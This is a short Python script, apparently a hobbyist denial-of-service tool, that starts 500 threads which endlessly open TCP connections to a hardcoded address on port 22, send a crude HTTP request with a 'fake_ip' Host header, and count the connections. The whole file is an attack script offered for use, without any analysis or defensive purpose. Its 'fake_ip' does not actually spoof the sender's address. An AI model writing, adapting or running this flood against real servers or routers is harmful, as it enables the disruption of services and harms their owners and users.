import threading
import socket

target = '172.16.0.1' #ip server or router
port = 22
fake_ip = '182.14.18.1'

already_connect = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        
        global already_connect
        already_connect += 1
        if already_connect % 500 == 0:
            print(already_connect)
        
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()